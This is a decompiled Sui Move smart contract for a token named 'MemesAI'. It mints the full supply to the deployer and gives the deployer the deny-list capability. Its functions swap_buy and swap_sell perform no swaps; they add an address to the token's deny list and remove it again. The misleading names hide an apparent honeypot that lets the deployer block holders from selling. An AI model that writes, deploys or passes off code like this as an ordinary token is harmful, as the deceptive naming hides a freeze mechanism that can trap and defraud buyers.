module 0x3866c87dec527bfc4abc4a5a0e60c6fbd21ad926e356f1737a598074868872f9::memesai {
    struct MEMESAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MEMESAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MEMESAI>(arg0, 9, b"MemesAI", b"Memes AI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUbDNeYK1Rea6ZUzozzijvXtDJMHJnkL5f5rmpSathHBx"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MEMESAI>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MEMESAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MEMESAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MEMESAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMESAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MEMESAI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMESAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MEMESAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

